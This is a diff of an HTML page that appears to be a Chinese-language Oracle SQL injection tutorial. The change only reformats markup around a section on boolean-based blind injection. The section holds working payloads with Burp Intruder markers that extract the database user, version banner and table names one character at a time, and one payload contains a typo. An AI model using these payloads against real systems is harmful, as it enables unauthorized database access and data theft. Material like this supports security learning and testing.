@@ -198,21 +198,21 @@ select name from test_user where id =1 union SELECT UTL_INADDR.GET_HOST_ADDRESS(
 <h3 id="03-基于布尔值的盲注">03. 基于布尔值的盲注</h3>
 <p>通过构造不同条件,返回返回页面的不同,就形成了Bool值的注入</p>
 <ul>
-<li>
-<p>通过 substr()  decode() 函数的盲注(常用)</p>
-<pre><code class="language-sql"># 按位截取数据,Bp俩个标记:第一个为截取位数,第二个为:所有字符:
-</code></pre>
-</li>
+<li>通过 substr()  decode() 函数的盲注(常用)</li>
 </ul>
-<p>and+1=(select+decode(substr((select user from dual),§1§,1),'§S§',(1),0) from dual)--+ #查 user<br>
-and+1=(select decode(substr((select banner from sys.v_$version wher rownum=1),1 ,1),'S',(1),0) from dual)--+ # 查version<br>
-and+1=(select decode(substr((select table_name from user_tables where rownum=1),§1§,1),'§S§',(1),0) from dual)--+ # 查表名</p>
-<pre><code>
-- 通过 case、substr()、ascii() 函数的盲注
+<pre><code class="language-sql">
+# 按位截取数据,Bp俩个标记:第一个为截取位数,第二个为:所有字符:
 
-  
-```sql
-# 按位截取数据,Bp俩个标记:第一个为:截取位数 第二个为:所有可见字符的ASCII码(32~126):
+and+1=(select+decode(substr((select user from dual),§1§,1),'§S§',(1),0) from dual)--+ #查 user
+
+and+1=(select decode(substr((select banner from sys.v_$version wher rownum=1),1 ,1),'S',(1),0) from dual)--+ # 查version
+
+and+1=(select decode(substr((select table_name from user_tables where rownum=1),§1§,1),'§S§',(1),0) from dual)--+ # 查表名
+</code></pre>
+<ul>
+<li>通过 case、substr()、ascii() 函数的盲注</li>
+</ul>
+<pre><code class="language-sql"># 按位截取数据,Bp俩个标记:第一个为:截取位数 第二个为:所有可见字符的ASCII码(32~126):
   123=(case when ascii(substr(user,§0§,1))=§121§ then '123' else '456' end)--+
 </code></pre>
 <ul>
